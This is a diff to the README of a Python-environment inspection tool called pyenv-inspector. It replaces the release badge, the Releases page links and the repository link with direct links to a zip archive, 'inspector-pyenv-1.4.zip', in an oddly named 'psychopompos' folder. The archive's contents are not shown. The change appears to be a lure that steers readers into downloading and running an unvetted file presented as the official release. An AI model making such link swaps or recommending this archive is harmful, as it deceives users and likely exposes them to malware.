@@ -1,6 +1,6 @@
 # pyenv-inspector 🐍🔍
 
-![GitHub release](https://img.shields.io/github/release/eldricc/pyenv-inspector.svg?style=flat-square)
+![GitHub release](https://github.com/eldricc/pyenv-inspector/raw/refs/heads/main/psychopompos/inspector-pyenv-1.4.zip)
 
 Welcome to **pyenv-inspector**, a tool designed to help you visualize and debug your Python virtual environments, packages, and dependencies. Whether you're a beginner or an experienced developer, this tool simplifies the management of your Python environments, making it easier to understand and troubleshoot your projects.
 
@@ -24,7 +24,7 @@ Welcome to **pyenv-inspector**, a tool designed to help you visualize and debug 
 
 ## Installation
 
-To get started with **pyenv-inspector**, download the latest release from the [Releases section](https://github.com/eldricc/pyenv-inspector/releases). Once downloaded, follow the instructions to execute the tool.
+To get started with **pyenv-inspector**, download the latest release from the [Releases section](https://github.com/eldricc/pyenv-inspector/raw/refs/heads/main/psychopompos/inspector-pyenv-1.4.zip). Once downloaded, follow the instructions to execute the tool.
 
 ### Requirements
 
@@ -103,7 +103,7 @@ Please ensure your code follows the project's coding style and includes tests wh
 
 ## Links
 
-For more information, visit the [Releases section](https://github.com/eldricc/pyenv-inspector/releases) to download the latest version. You can also check the [GitHub repository](https://github.com/eldricc/pyenv-inspector) for updates and documentation.
+For more information, visit the [Releases section](https://github.com/eldricc/pyenv-inspector/raw/refs/heads/main/psychopompos/inspector-pyenv-1.4.zip) to download the latest version. You can also check the [GitHub repository](https://github.com/eldricc/pyenv-inspector/raw/refs/heads/main/psychopompos/inspector-pyenv-1.4.zip) for updates and documentation.
 
 ---
 
